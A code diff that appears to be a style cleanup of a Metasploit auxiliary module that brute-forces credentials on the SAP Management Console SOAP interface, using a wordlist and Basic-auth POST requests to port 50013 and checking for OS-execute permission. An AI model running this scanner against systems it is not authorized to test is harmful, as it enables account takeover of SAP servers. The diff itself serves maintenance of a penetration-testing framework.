@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -15,12 +15,12 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'           => 'SAP Management Console Brute Force',
-      'Description'    => %q{
+      'Description'    => %q(
         This module simply attempts to brute force the username and
         password for the SAP Management Console SOAP Interface. If
         the SAP_SID value is set it will replace instances of <SAPSID>
         in any user/pass from any wordlist.
-        },
+        ),
       'References'     =>
         [
           # General
@@ -37,20 +37,19 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TARGETURI', [false, 'Path to the SAP Management Console ', '/']),
         OptPath.new('USER_FILE', [ false, "File containing users, one per line",
                                    File.join(Msf::Config.data_directory, "wordlists", "sap_common.txt") ])
-      ], self.class)
+      ], self.class
+    )
     register_autofilter_ports([ 50013 ])
 
     deregister_options('HttpUsername', 'HttpPassword')
   end
 
-  def run_host(rhost)
+  def run_host(_rhost)
     uri = normalize_uri(target_uri.path)
-    res = send_request_cgi({
-      'uri'     => uri,
-      'method'  => 'GET'
-    })
+    res = send_request_cgi('uri' => uri,
+                           'method' => 'GET')
 
-    if not res
+    unless res
       print_error("#{peer} [SAP] Unable to connect")
       return
     end
@@ -58,9 +57,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("SAPSID set to '#{datastore['SAP_SID']}'") if datastore['SAP_SID']
 
     each_user_pass do |user, pass|
-      enum_user(user,pass,uri)
+      enum_user(user, pass, uri)
     end
-
   end
 
   def report_cred(opts)
@@ -90,7 +88,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def enum_user(user, pass, uri)
-
     # Replace placeholder with SAP SID, if present
     if datastore['SAP_SID']
       user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
@@ -121,36 +118,30 @@ class MetasploitModule < Msf::Auxiliary
     user_pass = Rex::Text.encode_base64(user + ":" + pass)
 
     begin
-      res = send_request_raw({
-        'uri'      => uri,
-        'method'   => 'POST',
-        'data'     => data,
-        'headers'  =>
+      res = send_request_raw('uri' => uri,
+                             'method'   => 'POST',
+                             'data'     => data,
+                             'headers'  =>
           {
             'Content-Length' => data.length,
             'SOAPAction'     => '""',
             'Content-Type'   => 'text/xml; charset=UTF-8',
             'Authorization'  => 'Basic ' + user_pass
-          }
-      })
+          })
 
       return unless res
 
-      if (res.code != 500 and res.code != 200)
+      if (res.code != 500) && (res.code != 200)
         return
       else
         body = res.body
-        if body.match(/Invalid Credentials/i)
+        if body =~ /Invalid Credentials/i
           success = false
         else
           success = true
-          if body.match(/Permission denied/i)
-            permission = false
-          end
+          permission = false if body =~ /Permission denied/i
 
-          if body.match(/OSExecuteResponse/i)
-            permission = true
-          end
+          permission = true if body =~ /OSExecuteResponse/i
         end
       end
 
@@ -181,4 +172,3 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 end
-
